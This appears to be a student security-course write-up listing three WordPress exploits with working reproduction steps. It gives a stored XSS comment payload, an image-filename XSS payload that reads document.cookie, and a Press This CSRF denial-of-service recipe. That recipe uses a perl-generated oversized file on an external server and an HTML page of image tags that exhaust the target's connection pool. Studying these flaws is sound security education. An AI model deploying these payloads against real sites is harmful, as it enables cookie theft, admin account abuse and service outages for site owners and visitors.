# Week7Alternate
Exploit 1
Unauthenticated Stored Cross-Site Scripting (XSS)
Vulnerable in WordPress 4.2
Fixed in WordPress 4.2.1
Comments can store XSS, which can be activated if the comment is viewed. One could put in an XSS command that would abuse admin abilities to mess with their wordpress site, such as changing their password or deleting certain pages or other information.
Enter the following as a comment:
<a title='x onmouseover=alert(unescape(/hello%20world/.source))
style=position:absolute;left:0;top:0;width:5000px;height:5000px
 AAAAAAAAAAAA [64 kb] ...'></a>
 And then wait for someone to view the comment.
 
 Exploit 2
 Authenticated Stored Cross-Site Scripting via Image Filename
 Vulnerable in multiple versions as early as 2.5 and as far as 4.6
 fixed in Version 4.2.10 for 4.2, one of its latest fixes in 4.6.1
 WordPress basically doesn't do validation on the names of image files uploaded to wordpress. This means an attacker can put in malicious javascript code into wordpress.
 To recreate this exploit, upload a file with the name "cengizhansahinsumofpwn<img src=a onerror=alert(document.cookie)>.jpg" into wordpress. Once the image is viewed in wordpress, the code should execute.
 
 Exploit 3
 Press This CSRF DoS
 Vulnerable in multiple versions of Word Press from 4.2 to 4.7.2
 fixed in Version 4.2.13 for 4.2, latest fix in 4.7.3
 The "Press This" function of Word Press can scan a URL but there's no limit to the maximum amount of data that can be scanned from the link. Basically, taking advantage of this and tricking an admin of a WordPress page to look into it, an admin's WordPress server will be forced to download an almost infinite amount of data, making the server unavailable for a while.
 On another server, create a textfile with the command "perl -e 'print "<>"x28000000' > foo.txt" and another file called "dos.html". In the dos.html file, make sure there are enough entries to fill the WordPress server's connection pool, like:
 <img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
etc. etc., with "external server" being the external server address and "wp server" replaced with the word press server's address.
